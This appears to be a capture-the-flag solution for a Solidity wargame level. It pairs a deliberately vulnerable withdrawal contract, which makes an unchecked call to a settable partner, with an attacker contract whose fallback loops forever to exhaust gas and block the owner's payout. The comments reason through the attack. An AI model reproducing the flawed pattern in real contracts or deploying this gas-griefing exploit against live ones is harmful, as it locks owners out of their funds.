// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/**
Let's say our partner is hack , a contract that we make ourselves .
hack.call would trigger a custumizable fallback in our contract .
I can then revert inside fallback ? 
partner.call{value:amountToSend}(""); and fallback has revert seems to not revert the function withdraw() . How ? 
Because call is flexible . unlike transfer method 
So how to prevent the owner from withdrawing the funds ? 
What about causing an error other than revert(); ? Like oog (out of gas) ? 
when partner.call is called , a infinite loop is triggered and the payable(owner).transfer is never reached .

 */

contract hack {
    uint retarder = 0;
    fallback() external payable { 
        while(1 > 0) {
            retarder++;
        }
    }
}